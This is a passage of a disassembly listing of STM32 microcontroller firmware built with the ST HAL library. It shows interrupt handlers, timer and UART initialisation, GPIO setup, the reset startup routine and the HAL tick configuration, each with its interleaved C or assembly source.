  /* USER CODE END SysTick_IRQn 1 */
}
 8000df0:	bf00      	nop
 8000df2:	bd80      	pop	{r7, pc}

08000df4 <TIM2_IRQHandler>:

/**
  * @brief This function handles TIM2 global interrupt.
  */
void TIM2_IRQHandler(void)
{
 8000df4:	b580      	push	{r7, lr}
 8000df6:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN TIM2_IRQn 0 */

  /* USER CODE END TIM2_IRQn 0 */
  HAL_TIM_IRQHandler(&htim2);
 8000df8:	4802      	ldr	r0, [pc, #8]	; (8000e04 <TIM2_IRQHandler+0x10>)
 8000dfa:	f003 ffc1 	bl	8004d80 <HAL_TIM_IRQHandler>
  /* USER CODE BEGIN TIM2_IRQn 1 */

  /* USER CODE END TIM2_IRQn 1 */
}
 8000dfe:	bf00      	nop
 8000e00:	bd80      	pop	{r7, pc}
 8000e02:	bf00      	nop
 8000e04:	200002e4 	.word	0x200002e4

08000e08 <USB_IRQHandler>:

/**
  * @brief This function handles USB event interrupt through EXTI line 17.
  */
void USB_IRQHandler(void)
{
 8000e08:	b580      	push	{r7, lr}
 8000e0a:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_IRQn 0 */

  /* USER CODE END USB_IRQn 0 */
  HAL_PCD_IRQHandler(&hpcd_USB_FS);
 8000e0c:	4802      	ldr	r0, [pc, #8]	; (8000e18 <USB_IRQHandler+0x10>)
 8000e0e:	f001 f819 	bl	8001e44 <HAL_PCD_IRQHandler>
  /* USER CODE BEGIN USB_IRQn 1 */

  /* USER CODE END USB_IRQn 1 */
}
 8000e12:	bf00      	nop
 8000e14:	bd80      	pop	{r7, pc}
 8000e16:	bf00      	nop
 8000e18:	20000b7c 	.word	0x20000b7c

08000e1c <SystemInit>:
  * @brief  Setup the microcontroller system.
  * @retval None
  */

void SystemInit(void)
{
 8000e1c:	b480      	push	{r7}
 8000e1e:	af00      	add	r7, sp, #0
  SCB->VTOR = VECT_TAB_BASE_ADDRESS | VECT_TAB_OFFSET;
#endif

  /* FPU settings ------------------------------------------------------------*/
#if (__FPU_PRESENT == 1) && (__FPU_USED == 1)
  SCB->CPACR |= ((3UL << 20U)|(3UL << 22U));  /* set CP10 and CP11 Full Access */
 8000e20:	4b06      	ldr	r3, [pc, #24]	; (8000e3c <SystemInit+0x20>)
 8000e22:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8000e26:	4a05      	ldr	r2, [pc, #20]	; (8000e3c <SystemInit+0x20>)
 8000e28:	f443 0370 	orr.w	r3, r3, #15728640	; 0xf00000
 8000e2c:	f8c2 3088 	str.w	r3, [r2, #136]	; 0x88
#endif
}
 8000e30:	bf00      	nop
 8000e32:	46bd      	mov	sp, r7
 8000e34:	f85d 7b04 	ldr.w	r7, [sp], #4
 8000e38:	4770      	bx	lr
 8000e3a:	bf00      	nop
 8000e3c:	e000ed00 	.word	0xe000ed00

08000e40 <MX_TIM2_Init>:

TIM_HandleTypeDef htim2;

/* TIM2 init function */
void MX_TIM2_Init(void)
{
 8000e40:	b580      	push	{r7, lr}
 8000e42:	b088      	sub	sp, #32
 8000e44:	af00      	add	r7, sp, #0

  /* USER CODE BEGIN TIM2_Init 0 */

  /* USER CODE END TIM2_Init 0 */

  TIM_ClockConfigTypeDef sClockSourceConfig = {0};
 8000e46:	f107 0310 	add.w	r3, r7, #16
 8000e4a:	2200      	movs	r2, #0
 8000e4c:	601a      	str	r2, [r3, #0]
 8000e4e:	605a      	str	r2, [r3, #4]
 8000e50:	609a      	str	r2, [r3, #8]
 8000e52:	60da      	str	r2, [r3, #12]
  TIM_MasterConfigTypeDef sMasterConfig = {0};
 8000e54:	1d3b      	adds	r3, r7, #4
 8000e56:	2200      	movs	r2, #0
 8000e58:	601a      	str	r2, [r3, #0]
 8000e5a:	605a      	str	r2, [r3, #4]
 8000e5c:	609a      	str	r2, [r3, #8]

  /* USER CODE BEGIN TIM2_Init 1 */

  /* USER CODE END TIM2_Init 1 */
  htim2.Instance = TIM2;
 8000e5e:	4b1e      	ldr	r3, [pc, #120]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e60:	f04f 4280 	mov.w	r2, #1073741824	; 0x40000000
 8000e64:	601a      	str	r2, [r3, #0]
  htim2.Init.Prescaler = 7199;
 8000e66:	4b1c      	ldr	r3, [pc, #112]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e68:	f641 421f 	movw	r2, #7199	; 0x1c1f
 8000e6c:	605a      	str	r2, [r3, #4]
  htim2.Init.CounterMode = TIM_COUNTERMODE_UP;
 8000e6e:	4b1a      	ldr	r3, [pc, #104]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e70:	2200      	movs	r2, #0
 8000e72:	609a      	str	r2, [r3, #8]
  htim2.Init.Period = 399;
 8000e74:	4b18      	ldr	r3, [pc, #96]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e76:	f240 128f 	movw	r2, #399	; 0x18f
 8000e7a:	60da      	str	r2, [r3, #12]
  htim2.Init.ClockDivision = TIM_CLOCKDIVISION_DIV1;
 8000e7c:	4b16      	ldr	r3, [pc, #88]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e7e:	2200      	movs	r2, #0
 8000e80:	611a      	str	r2, [r3, #16]
  htim2.Init.AutoReloadPreload = TIM_AUTORELOAD_PRELOAD_DISABLE;
 8000e82:	4b15      	ldr	r3, [pc, #84]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e84:	2200      	movs	r2, #0
 8000e86:	619a      	str	r2, [r3, #24]
  if (HAL_TIM_Base_Init(&htim2) != HAL_OK)
 8000e88:	4813      	ldr	r0, [pc, #76]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000e8a:	f003 fece 	bl	8004c2a <HAL_TIM_Base_Init>
 8000e8e:	4603      	mov	r3, r0
 8000e90:	2b00      	cmp	r3, #0
 8000e92:	d001      	beq.n	8000e98 <MX_TIM2_Init+0x58>
  {
    Error_Handler();
 8000e94:	f7ff feda 	bl	8000c4c <Error_Handler>
  }
  sClockSourceConfig.ClockSource = TIM_CLOCKSOURCE_INTERNAL;
 8000e98:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8000e9c:	613b      	str	r3, [r7, #16]
  if (HAL_TIM_ConfigClockSource(&htim2, &sClockSourceConfig) != HAL_OK)
 8000e9e:	f107 0310 	add.w	r3, r7, #16
 8000ea2:	4619      	mov	r1, r3
 8000ea4:	480c      	ldr	r0, [pc, #48]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000ea6:	f004 f86d 	bl	8004f84 <HAL_TIM_ConfigClockSource>
 8000eaa:	4603      	mov	r3, r0
 8000eac:	2b00      	cmp	r3, #0
 8000eae:	d001      	beq.n	8000eb4 <MX_TIM2_Init+0x74>
  {
    Error_Handler();
 8000eb0:	f7ff fecc 	bl	8000c4c <Error_Handler>
  }
  sMasterConfig.MasterOutputTrigger = TIM_TRGO_RESET;
 8000eb4:	2300      	movs	r3, #0
 8000eb6:	607b      	str	r3, [r7, #4]
  sMasterConfig.MasterSlaveMode = TIM_MASTERSLAVEMODE_DISABLE;
 8000eb8:	2300      	movs	r3, #0
 8000eba:	60fb      	str	r3, [r7, #12]
  if (HAL_TIMEx_MasterConfigSynchronization(&htim2, &sMasterConfig) != HAL_OK)
 8000ebc:	1d3b      	adds	r3, r7, #4
 8000ebe:	4619      	mov	r1, r3
 8000ec0:	4805      	ldr	r0, [pc, #20]	; (8000ed8 <MX_TIM2_Init+0x98>)
 8000ec2:	f004 fa4f 	bl	8005364 <HAL_TIMEx_MasterConfigSynchronization>
 8000ec6:	4603      	mov	r3, r0
 8000ec8:	2b00      	cmp	r3, #0
 8000eca:	d001      	beq.n	8000ed0 <MX_TIM2_Init+0x90>
  {
    Error_Handler();
 8000ecc:	f7ff febe 	bl	8000c4c <Error_Handler>
  }
  /* USER CODE BEGIN TIM2_Init 2 */

  /* USER CODE END TIM2_Init 2 */

}
 8000ed0:	bf00      	nop
 8000ed2:	3720      	adds	r7, #32
 8000ed4:	46bd      	mov	sp, r7
 8000ed6:	bd80      	pop	{r7, pc}
 8000ed8:	200002e4 	.word	0x200002e4

08000edc <HAL_TIM_Base_MspInit>:

void HAL_TIM_Base_MspInit(TIM_HandleTypeDef* tim_baseHandle)
{
 8000edc:	b580      	push	{r7, lr}
 8000ede:	b084      	sub	sp, #16
 8000ee0:	af00      	add	r7, sp, #0
 8000ee2:	6078      	str	r0, [r7, #4]

  if(tim_baseHandle->Instance==TIM2)
 8000ee4:	687b      	ldr	r3, [r7, #4]
 8000ee6:	681b      	ldr	r3, [r3, #0]
 8000ee8:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8000eec:	d113      	bne.n	8000f16 <HAL_TIM_Base_MspInit+0x3a>
  {
  /* USER CODE BEGIN TIM2_MspInit 0 */

  /* USER CODE END TIM2_MspInit 0 */
    /* TIM2 clock enable */
    __HAL_RCC_TIM2_CLK_ENABLE();
 8000eee:	4b0c      	ldr	r3, [pc, #48]	; (8000f20 <HAL_TIM_Base_MspInit+0x44>)
 8000ef0:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000ef2:	4a0b      	ldr	r2, [pc, #44]	; (8000f20 <HAL_TIM_Base_MspInit+0x44>)
 8000ef4:	f043 0301 	orr.w	r3, r3, #1
 8000ef8:	6593      	str	r3, [r2, #88]	; 0x58
 8000efa:	4b09      	ldr	r3, [pc, #36]	; (8000f20 <HAL_TIM_Base_MspInit+0x44>)
 8000efc:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000efe:	f003 0301 	and.w	r3, r3, #1
 8000f02:	60fb      	str	r3, [r7, #12]
 8000f04:	68fb      	ldr	r3, [r7, #12]

    /* TIM2 interrupt Init */
    HAL_NVIC_SetPriority(TIM2_IRQn, 0, 0);
 8000f06:	2200      	movs	r2, #0
 8000f08:	2100      	movs	r1, #0
 8000f0a:	201c      	movs	r0, #28
 8000f0c:	f000 fa41 	bl	8001392 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(TIM2_IRQn);
 8000f10:	201c      	movs	r0, #28
 8000f12:	f000 fa5a 	bl	80013ca <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN TIM2_MspInit 1 */

  /* USER CODE END TIM2_MspInit 1 */
  }
}
 8000f16:	bf00      	nop
 8000f18:	3710      	adds	r7, #16
 8000f1a:	46bd      	mov	sp, r7
 8000f1c:	bd80      	pop	{r7, pc}
 8000f1e:	bf00      	nop
 8000f20:	40021000 	.word	0x40021000

08000f24 <MX_USART2_UART_Init>:
UART_HandleTypeDef huart2;

/* USART2 init function */

void MX_USART2_UART_Init(void)
{
 8000f24:	b580      	push	{r7, lr}
 8000f26:	af00      	add	r7, sp, #0
  /* USER CODE END USART2_Init 0 */

  /* USER CODE BEGIN USART2_Init 1 */

  /* USER CODE END USART2_Init 1 */
  huart2.Instance = USART2;
 8000f28:	4b14      	ldr	r3, [pc, #80]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f2a:	4a15      	ldr	r2, [pc, #84]	; (8000f80 <MX_USART2_UART_Init+0x5c>)
 8000f2c:	601a      	str	r2, [r3, #0]
  huart2.Init.BaudRate = 115200;
 8000f2e:	4b13      	ldr	r3, [pc, #76]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f30:	f44f 32e1 	mov.w	r2, #115200	; 0x1c200
 8000f34:	605a      	str	r2, [r3, #4]
  huart2.Init.WordLength = UART_WORDLENGTH_8B;
 8000f36:	4b11      	ldr	r3, [pc, #68]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f38:	2200      	movs	r2, #0
 8000f3a:	609a      	str	r2, [r3, #8]
  huart2.Init.StopBits = UART_STOPBITS_1;
 8000f3c:	4b0f      	ldr	r3, [pc, #60]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f3e:	2200      	movs	r2, #0
 8000f40:	60da      	str	r2, [r3, #12]
  huart2.Init.Parity = UART_PARITY_NONE;
 8000f42:	4b0e      	ldr	r3, [pc, #56]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f44:	2200      	movs	r2, #0
 8000f46:	611a      	str	r2, [r3, #16]
  huart2.Init.Mode = UART_MODE_TX_RX;
 8000f48:	4b0c      	ldr	r3, [pc, #48]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f4a:	220c      	movs	r2, #12
 8000f4c:	615a      	str	r2, [r3, #20]
  huart2.Init.HwFlowCtl = UART_HWCONTROL_NONE;
 8000f4e:	4b0b      	ldr	r3, [pc, #44]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f50:	2200      	movs	r2, #0
 8000f52:	619a      	str	r2, [r3, #24]
  huart2.Init.OverSampling = UART_OVERSAMPLING_16;
 8000f54:	4b09      	ldr	r3, [pc, #36]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f56:	2200      	movs	r2, #0
 8000f58:	61da      	str	r2, [r3, #28]
  huart2.Init.OneBitSampling = UART_ONE_BIT_SAMPLE_DISABLE;
 8000f5a:	4b08      	ldr	r3, [pc, #32]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f5c:	2200      	movs	r2, #0
 8000f5e:	621a      	str	r2, [r3, #32]
  huart2.AdvancedInit.AdvFeatureInit = UART_ADVFEATURE_NO_INIT;
 8000f60:	4b06      	ldr	r3, [pc, #24]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f62:	2200      	movs	r2, #0
 8000f64:	625a      	str	r2, [r3, #36]	; 0x24
  if (HAL_UART_Init(&huart2) != HAL_OK)
 8000f66:	4805      	ldr	r0, [pc, #20]	; (8000f7c <MX_USART2_UART_Init+0x58>)
 8000f68:	f004 fa80 	bl	800546c <HAL_UART_Init>
 8000f6c:	4603      	mov	r3, r0
 8000f6e:	2b00      	cmp	r3, #0
 8000f70:	d001      	beq.n	8000f76 <MX_USART2_UART_Init+0x52>
  {
    Error_Handler();
 8000f72:	f7ff fe6b 	bl	8000c4c <Error_Handler>
  }
  /* USER CODE BEGIN USART2_Init 2 */

  /* USER CODE END USART2_Init 2 */

}
 8000f76:	bf00      	nop
 8000f78:	bd80      	pop	{r7, pc}
 8000f7a:	bf00      	nop
 8000f7c:	20000330 	.word	0x20000330
 8000f80:	40004400 	.word	0x40004400

08000f84 <HAL_UART_MspInit>:

void HAL_UART_MspInit(UART_HandleTypeDef* uartHandle)
{
 8000f84:	b580      	push	{r7, lr}
 8000f86:	b09e      	sub	sp, #120	; 0x78
 8000f88:	af00      	add	r7, sp, #0
 8000f8a:	6078      	str	r0, [r7, #4]

  GPIO_InitTypeDef GPIO_InitStruct = {0};
 8000f8c:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8000f90:	2200      	movs	r2, #0
 8000f92:	601a      	str	r2, [r3, #0]
 8000f94:	605a      	str	r2, [r3, #4]
 8000f96:	609a      	str	r2, [r3, #8]
 8000f98:	60da      	str	r2, [r3, #12]
 8000f9a:	611a      	str	r2, [r3, #16]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 8000f9c:	f107 0310 	add.w	r3, r7, #16
 8000fa0:	2254      	movs	r2, #84	; 0x54
 8000fa2:	2100      	movs	r1, #0
 8000fa4:	4618      	mov	r0, r3
 8000fa6:	f00b ffff 	bl	800cfa8 <memset>
  if(uartHandle->Instance==USART2)
 8000faa:	687b      	ldr	r3, [r7, #4]
 8000fac:	681b      	ldr	r3, [r3, #0]
 8000fae:	4a28      	ldr	r2, [pc, #160]	; (8001050 <HAL_UART_MspInit+0xcc>)
 8000fb0:	4293      	cmp	r3, r2
 8000fb2:	d148      	bne.n	8001046 <HAL_UART_MspInit+0xc2>

  /* USER CODE END USART2_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USART2;
 8000fb4:	2302      	movs	r3, #2
 8000fb6:	613b      	str	r3, [r7, #16]
    PeriphClkInit.Usart2ClockSelection = RCC_USART2CLKSOURCE_PCLK1;
 8000fb8:	2300      	movs	r3, #0
 8000fba:	637b      	str	r3, [r7, #52]	; 0x34
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 8000fbc:	f107 0310 	add.w	r3, r7, #16
 8000fc0:	4618      	mov	r0, r3
 8000fc2:	f003 fa97 	bl	80044f4 <HAL_RCCEx_PeriphCLKConfig>
 8000fc6:	4603      	mov	r3, r0
 8000fc8:	2b00      	cmp	r3, #0
 8000fca:	d001      	beq.n	8000fd0 <HAL_UART_MspInit+0x4c>
    {
      Error_Handler();
 8000fcc:	f7ff fe3e 	bl	8000c4c <Error_Handler>
    }

    /* USART2 clock enable */
    __HAL_RCC_USART2_CLK_ENABLE();
 8000fd0:	4b20      	ldr	r3, [pc, #128]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000fd2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000fd4:	4a1f      	ldr	r2, [pc, #124]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000fd6:	f443 3300 	orr.w	r3, r3, #131072	; 0x20000
 8000fda:	6593      	str	r3, [r2, #88]	; 0x58
 8000fdc:	4b1d      	ldr	r3, [pc, #116]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000fde:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8000fe0:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8000fe4:	60fb      	str	r3, [r7, #12]
 8000fe6:	68fb      	ldr	r3, [r7, #12]

    __HAL_RCC_GPIOA_CLK_ENABLE();
 8000fe8:	4b1a      	ldr	r3, [pc, #104]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000fea:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000fec:	4a19      	ldr	r2, [pc, #100]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000fee:	f043 0301 	orr.w	r3, r3, #1
 8000ff2:	64d3      	str	r3, [r2, #76]	; 0x4c
 8000ff4:	4b17      	ldr	r3, [pc, #92]	; (8001054 <HAL_UART_MspInit+0xd0>)
 8000ff6:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 8000ff8:	f003 0301 	and.w	r3, r3, #1
 8000ffc:	60bb      	str	r3, [r7, #8]
 8000ffe:	68bb      	ldr	r3, [r7, #8]
    /**USART2 GPIO Configuration
    PA2     ------> USART2_TX
    PA15 (JTDI)     ------> USART2_RX
    */
    GPIO_InitStruct.Pin = VCP_TX_Pin;
 8001000:	2304      	movs	r3, #4
 8001002:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001004:	2302      	movs	r3, #2
 8001006:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 8001008:	2300      	movs	r3, #0
 800100a:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 800100c:	2303      	movs	r3, #3
 800100e:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF7_USART2;
 8001010:	2307      	movs	r3, #7
 8001012:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_TX_GPIO_Port, &GPIO_InitStruct);
 8001014:	f107 0364 	add.w	r3, r7, #100	; 0x64
 8001018:	4619      	mov	r1, r3
 800101a:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 800101e:	f000 fc67 	bl	80018f0 <HAL_GPIO_Init>

    GPIO_InitStruct.Pin = VCP_RX_Pin;
 8001022:	f44f 4300 	mov.w	r3, #32768	; 0x8000
 8001026:	667b      	str	r3, [r7, #100]	; 0x64
    GPIO_InitStruct.Mode = GPIO_MODE_AF_PP;
 8001028:	2302      	movs	r3, #2
 800102a:	66bb      	str	r3, [r7, #104]	; 0x68
    GPIO_InitStruct.Pull = GPIO_NOPULL;
 800102c:	2300      	movs	r3, #0
 800102e:	66fb      	str	r3, [r7, #108]	; 0x6c
    GPIO_InitStruct.Speed = GPIO_SPEED_FREQ_VERY_HIGH;
 8001030:	2303      	movs	r3, #3
 8001032:	673b      	str	r3, [r7, #112]	; 0x70
    GPIO_InitStruct.Alternate = GPIO_AF3_USART2;
 8001034:	2303      	movs	r3, #3
 8001036:	677b      	str	r3, [r7, #116]	; 0x74
    HAL_GPIO_Init(VCP_RX_GPIO_Port, &GPIO_InitStruct);
 8001038:	f107 0364 	add.w	r3, r7, #100	; 0x64
 800103c:	4619      	mov	r1, r3
 800103e:	f04f 4090 	mov.w	r0, #1207959552	; 0x48000000
 8001042:	f000 fc55 	bl	80018f0 <HAL_GPIO_Init>

  /* USER CODE BEGIN USART2_MspInit 1 */

  /* USER CODE END USART2_MspInit 1 */
  }
}
 8001046:	bf00      	nop
 8001048:	3778      	adds	r7, #120	; 0x78
 800104a:	46bd      	mov	sp, r7
 800104c:	bd80      	pop	{r7, pc}
 800104e:	bf00      	nop
 8001050:	40004400 	.word	0x40004400
 8001054:	40021000 	.word	0x40021000

08001058 <Reset_Handler>:

    .section	.text.Reset_Handler
	.weak	Reset_Handler
	.type	Reset_Handler, %function
Reset_Handler:
  ldr   sp, =_estack    /* Set stack pointer */
 8001058:	f8df d034 	ldr.w	sp, [pc, #52]	; 8001090 <LoopForever+0x2>

/* Call the clock system initialization function.*/
    bl  SystemInit
 800105c:	f7ff fede 	bl	8000e1c <SystemInit>

/* Copy the data segment initializers from flash to SRAM */
  ldr r0, =_sdata
 8001060:	480c      	ldr	r0, [pc, #48]	; (8001094 <LoopForever+0x6>)
  ldr r1, =_edata
 8001062:	490d      	ldr	r1, [pc, #52]	; (8001098 <LoopForever+0xa>)
  ldr r2, =_sidata
 8001064:	4a0d      	ldr	r2, [pc, #52]	; (800109c <LoopForever+0xe>)
  movs r3, #0
 8001066:	2300      	movs	r3, #0
  b LoopCopyDataInit
 8001068:	e002      	b.n	8001070 <LoopCopyDataInit>

0800106a <CopyDataInit>:

CopyDataInit:
  ldr r4, [r2, r3]
 800106a:	58d4      	ldr	r4, [r2, r3]
  str r4, [r0, r3]
 800106c:	50c4      	str	r4, [r0, r3]
  adds r3, r3, #4
 800106e:	3304      	adds	r3, #4

08001070 <LoopCopyDataInit>:

LoopCopyDataInit:
  adds r4, r0, r3
 8001070:	18c4      	adds	r4, r0, r3
  cmp r4, r1
 8001072:	428c      	cmp	r4, r1
  bcc CopyDataInit
 8001074:	d3f9      	bcc.n	800106a <CopyDataInit>
  
/* Zero fill the bss segment. */
  ldr r2, =_sbss
 8001076:	4a0a      	ldr	r2, [pc, #40]	; (80010a0 <LoopForever+0x12>)
  ldr r4, =_ebss
 8001078:	4c0a      	ldr	r4, [pc, #40]	; (80010a4 <LoopForever+0x16>)
  movs r3, #0
 800107a:	2300      	movs	r3, #0
  b LoopFillZerobss
 800107c:	e001      	b.n	8001082 <LoopFillZerobss>

0800107e <FillZerobss>:

FillZerobss:
  str  r3, [r2]
 800107e:	6013      	str	r3, [r2, #0]
  adds r2, r2, #4
 8001080:	3204      	adds	r2, #4

08001082 <LoopFillZerobss>:

LoopFillZerobss:
  cmp r2, r4
 8001082:	42a2      	cmp	r2, r4
  bcc FillZerobss
 8001084:	d3fb      	bcc.n	800107e <FillZerobss>

/* Call static constructors */
    bl __libc_init_array
 8001086:	f00b ff97 	bl	800cfb8 <__libc_init_array>
/* Call the application's entry point.*/
	bl	main
 800108a:	f7ff fa7d 	bl	8000588 <main>

0800108e <LoopForever>:

LoopForever:
    b LoopForever
 800108e:	e7fe      	b.n	800108e <LoopForever>
  ldr   sp, =_estack    /* Set stack pointer */
 8001090:	20010000 	.word	0x20010000
  ldr r0, =_sdata
 8001094:	20000000 	.word	0x20000000
  ldr r1, =_edata
 8001098:	20000240 	.word	0x20000240
  ldr r2, =_sidata
 800109c:	0800d1dc 	.word	0x0800d1dc
  ldr r2, =_sbss
 80010a0:	20000240 	.word	0x20000240
  ldr r4, =_ebss
 80010a4:	20001f14 	.word	0x20001f14

080010a8 <ADC1_IRQHandler>:
 * @retval : None
*/
    .section	.text.Default_Handler,"ax",%progbits
Default_Handler:
Infinite_Loop:
	b	Infinite_Loop
 80010a8:	e7fe      	b.n	80010a8 <ADC1_IRQHandler>

080010aa <HAL_Init>:
  *         each 1ms in the SysTick_Handler() interrupt handler.
  *
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_Init(void)
{
 80010aa:	b580      	push	{r7, lr}
 80010ac:	b082      	sub	sp, #8
 80010ae:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef  status = HAL_OK;
 80010b0:	2300      	movs	r3, #0
 80010b2:	71fb      	strb	r3, [r7, #7]
#if (PREFETCH_ENABLE != 0)
  __HAL_FLASH_PREFETCH_BUFFER_ENABLE();
#endif /* PREFETCH_ENABLE */

  /* Set Interrupt Group Priority */
  HAL_NVIC_SetPriorityGrouping(NVIC_PRIORITYGROUP_4);
 80010b4:	2003      	movs	r0, #3
 80010b6:	f000 f961 	bl	800137c <HAL_NVIC_SetPriorityGrouping>

  /* Use SysTick as time base source and configure 1ms tick (default clock after Reset is MSI) */
  if (HAL_InitTick(TICK_INT_PRIORITY) != HAL_OK)
 80010ba:	2000      	movs	r0, #0
 80010bc:	f000 f80e 	bl	80010dc <HAL_InitTick>
 80010c0:	4603      	mov	r3, r0
 80010c2:	2b00      	cmp	r3, #0
 80010c4:	d002      	beq.n	80010cc <HAL_Init+0x22>
  {
    status = HAL_ERROR;
 80010c6:	2301      	movs	r3, #1
 80010c8:	71fb      	strb	r3, [r7, #7]
 80010ca:	e001      	b.n	80010d0 <HAL_Init+0x26>
  }
  else
  {
    /* Init the low level hardware */
    HAL_MspInit();
 80010cc:	f7ff fe44 	bl	8000d58 <HAL_MspInit>
  }

  /* Return function status */
  return status;
 80010d0:	79fb      	ldrb	r3, [r7, #7]
}
 80010d2:	4618      	mov	r0, r3
 80010d4:	3708      	adds	r7, #8
 80010d6:	46bd      	mov	sp, r7
 80010d8:	bd80      	pop	{r7, pc}
	...

080010dc <HAL_InitTick>:
  *       implementation  in user file.
  * @param TickPriority  Tick interrupt priority.
  * @retval HAL status
  */
__weak HAL_StatusTypeDef HAL_InitTick(uint32_t TickPriority)
{
 80010dc:	b580      	push	{r7, lr}
 80010de:	b084      	sub	sp, #16
 80010e0:	af00      	add	r7, sp, #0
 80010e2:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef  status = HAL_OK;
 80010e4:	2300      	movs	r3, #0
 80010e6:	73fb      	strb	r3, [r7, #15]

  /* Check uwTickFreq for MisraC 2012 (even if uwTickFreq is a enum type that doesn't take the value zero)*/
  if ((uint32_t)uwTickFreq != 0U)
 80010e8:	4b17      	ldr	r3, [pc, #92]	; (8001148 <HAL_InitTick+0x6c>)
 80010ea:	781b      	ldrb	r3, [r3, #0]
 80010ec:	2b00      	cmp	r3, #0
 80010ee:	d023      	beq.n	8001138 <HAL_InitTick+0x5c>
  {
    /*Configure the SysTick to have interrupt in 1ms time basis*/
    if (HAL_SYSTICK_Config(SystemCoreClock / (1000U / (uint32_t)uwTickFreq)) == 0U)
 80010f0:	4b16      	ldr	r3, [pc, #88]	; (800114c <HAL_InitTick+0x70>)
 80010f2:	681a      	ldr	r2, [r3, #0]
 80010f4:	4b14      	ldr	r3, [pc, #80]	; (8001148 <HAL_InitTick+0x6c>)
 80010f6:	781b      	ldrb	r3, [r3, #0]
 80010f8:	4619      	mov	r1, r3
 80010fa:	f44f 737a 	mov.w	r3, #1000	; 0x3e8
 80010fe:	fbb3 f3f1 	udiv	r3, r3, r1
 8001102:	fbb2 f3f3 	udiv	r3, r2, r3
 8001106:	4618      	mov	r0, r3
 8001108:	f000 f96d 	bl	80013e6 <HAL_SYSTICK_Config>
 800110c:	4603      	mov	r3, r0
 800110e:	2b00      	cmp	r3, #0
 8001110:	d10f      	bne.n	8001132 <HAL_InitTick+0x56>
    {
      /* Configure the SysTick IRQ priority */
      if (TickPriority < (1UL << __NVIC_PRIO_BITS))
 8001112:	687b      	ldr	r3, [r7, #4]
 8001114:	2b0f      	cmp	r3, #15
 8001116:	d809      	bhi.n	800112c <HAL_InitTick+0x50>
      {
        HAL_NVIC_SetPriority(SysTick_IRQn, TickPriority, 0U);
 8001118:	2200      	movs	r2, #0
 800111a:	6879      	ldr	r1, [r7, #4]
 800111c:	f04f 30ff 	mov.w	r0, #4294967295
 8001120:	f000 f937 	bl	8001392 <HAL_NVIC_SetPriority>
        uwTickPrio = TickPriority;
 8001124:	4a0a      	ldr	r2, [pc, #40]	; (8001150 <HAL_InitTick+0x74>)
 8001126:	687b      	ldr	r3, [r7, #4]
 8001128:	6013      	str	r3, [r2, #0]
 800112a:	e007      	b.n	800113c <HAL_InitTick+0x60>
      }
      else
      {
        status = HAL_ERROR;
 800112c:	2301      	movs	r3, #1
 800112e:	73fb      	strb	r3, [r7, #15]
 8001130:	e004      	b.n	800113c <HAL_InitTick+0x60>
      }
    }
    else
    {
      status = HAL_ERROR;
 8001132:	2301      	movs	r3, #1
 8001134:	73fb      	strb	r3, [r7, #15]
 8001136:	e001      	b.n	800113c <HAL_InitTick+0x60>
    }
  }
  else
  {
    status = HAL_ERROR;
 8001138:	2301      	movs	r3, #1
 800113a:	73fb      	strb	r3, [r7, #15]
  }

  /* Return function status */
  return status;
 800113c:	7bfb      	ldrb	r3, [r7, #15]
}
 800113e:	4618      	mov	r0, r3
 8001140:	3710      	adds	r7, #16
 8001142:	46bd      	mov	sp, r7
 8001144:	bd80      	pop	{r7, pc}
 8001146:	bf00      	nop
 8001148:	20000008 	.word	0x20000008
 800114c:	20000000 	.word	0x20000000
 8001150:	20000004 	.word	0x20000004

